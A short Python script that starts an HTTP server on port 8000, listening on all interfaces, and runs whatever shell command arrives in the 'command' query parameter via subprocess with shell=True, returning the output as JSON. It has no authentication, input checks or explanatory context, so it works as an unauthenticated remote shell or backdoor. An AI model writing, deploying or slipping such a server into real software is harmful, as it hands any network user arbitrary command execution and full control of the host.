from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import subprocess
import json
class RequestHandler(BaseHTTPRequestHandler):        
    def do_GET(self):

        parsed_url = urlparse(self.path)
        query_params = parse_qs(parsed_url.query)

        command = query_params.get('command', [''])[0]

        try:
            output = subprocess.check_output(command, shell=True, timeout=15).decode('utf-8')

            response = {
                'command': command,
                'output': output,
                'status': 1
            }

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()

            self.wfile.write(json.dumps(response).encode())
        except subprocess.TimeoutExpired:

            error_response = {
                'error': 'Command failed (timeout)',
                'status': 0
            }

            self.send_response(500)
            self.send_header('Content-type', 'application/json')
            self.end_headers()

            self.wfile.write(json.dumps(error_response).encode())


def run_server(port=8000):
    server_address = ('', port)
    httpd = HTTPServer(server_address, RequestHandler)
    print(f"HTTP Server Started on {port}")
    httpd.serve_forever()

run_server()
